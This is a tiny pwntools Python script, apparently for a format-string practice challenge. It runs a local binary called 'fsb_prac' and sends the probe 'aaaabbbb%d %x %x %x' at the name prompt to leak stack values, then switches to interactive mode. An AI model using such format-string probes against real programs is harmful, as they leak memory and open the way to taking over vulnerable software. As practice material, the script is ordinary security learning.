from pwn import *

p = process("./fsb_prac")


pause()
p.sendlineafter("what is your name?","aaaabbbb%d %x %x %x")

p.interactive()